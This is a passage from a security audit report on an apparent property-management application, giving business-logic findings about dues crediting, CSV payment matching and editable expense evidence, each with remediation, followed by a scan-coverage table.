- **Impact**: A resident can select an arbitrary low-cost-sounding category and submit an arbitrarily large amount, laundering it into dues credit with no category-vs-amount cross-check.
- **Remediation**: Add an optional `MaxAmount`/`SuggestedMaxAmount` field to `IncomeExpenseCategory` and validate against it in `MahsupService.CreateAsync`, best implemented alongside the mahsup-approval-queue remediation.

---

#### CashBank CSV import fuzzy-matches dues with no confidence threshold

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Likely Vulnerable ⚠
- **Endpoint / File**: `GET /CashBank/PreviewImport` → `POST /CashBank/CommitImport` — `Controllers/CashBankController.cs` (`MatchDuesOption`, `MatchCategory`, `CommitImport`)
- **Severity rationale**: Requires an inattentive/negligent staff reviewer rather than a pure server-side gap — the feature runs behind an editable, human-reviewed preview form and is staff-module-gated.
- **Issue**: `MatchDuesOption`/`MatchCategory` use unbounded token-overlap scoring with no minimum-score/confidence threshold (`Where(x => x.Score > 0)`); the preview UI only warns when a match is null, never distinguishing low-confidence from high-confidence matches. `CommitImport` never cross-checks amount against `installment.RemainingAmount`.
- **Impact**: On a large CSV batch, a row can be silently pre-matched to the wrong unit's dues installment via incidental text overlap, and a busy operator is unlikely to catch it — misapplying a payment to the wrong unit's debt.
- **Remediation**: Compute and store a match confidence score; require a minimum threshold or exact unit-code match before pre-filling; visibly flag low-confidence rows; add an amount-vs-`RemainingAmount` sanity check in `CommitImport`.

---

### Low

#### Mahsup evidence and description remain resident-editable indefinitely after credit is applied

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Likely Vulnerable ⚠
- **Endpoint / File**: `POST /m/Gider/Duzenle/{id}` — `Areas/Mobile/Controllers/GiderController.cs` (lines 278-329, 353-405)
- **Severity rationale**: Lowest-impact finding in the mahsup chain — residents cannot delete/swap existing evidence photos (`EkSil` explicitly `Forbid()`s residents) and amount/category are locked post-creation, limiting the blast radius to non-monetary fields (description text, additional photos).
- **Issue**: `MahsupIslem` has no `Status`/`Approved`/`ReviewedAt` field; `Duzenle` permits the owning resident to edit the description and append new photos at any later time with no re-review trigger or versioning distinguishing original-approval content from later edits.
- **Impact**: Reduced evidentiary trust for already-credited transactions — a resident could pad the record with a more convincing photo after the fact or rewrite the narrative description without staff visibility into the change.
- **Remediation**: Add a `Status`/`ReviewedAt` field to `MahsupIslem`; lock `Duzenle` for residents post-approval or route edits through re-approval; version/timestamp each attachment and description edit distinctly.

---

## Appendix: Scan Coverage

| Scan | Result File | Status |
|------|-------------|--------|
| IDOR | `sast/idor-results.md` | Completed |
| SQLi | `sast/sqli-results.md` | Completed |
| SSRF | `sast/ssrf-results.md` | Completed |
| XSS | `sast/xss-results.md` | Completed |
| RCE | `sast/rce-results.md` | Completed |
| XXE | `sast/xxe-results.md` | Completed |
| File Upload | `sast/fileupload-results.md` | Completed |
| Path Traversal | `sast/pathtraversal-results.md` | Completed |
| SSTI | `sast/ssti-results.md` | Completed |
| JWT | `sast/jwt-results.md` | Completed (no JWT usage in codebase) |
| Missing Auth | `sast/missingauth-results.md` | Completed |
| Business Logic | `sast/businesslogic-results.md` | Completed |
| GraphQL injection | `sast/graphql-results.md` | Completed (no GraphQL technology in codebase) |
| Hardcoded Secrets | `sast/hardcodedsecrets-results.md` | Completed |
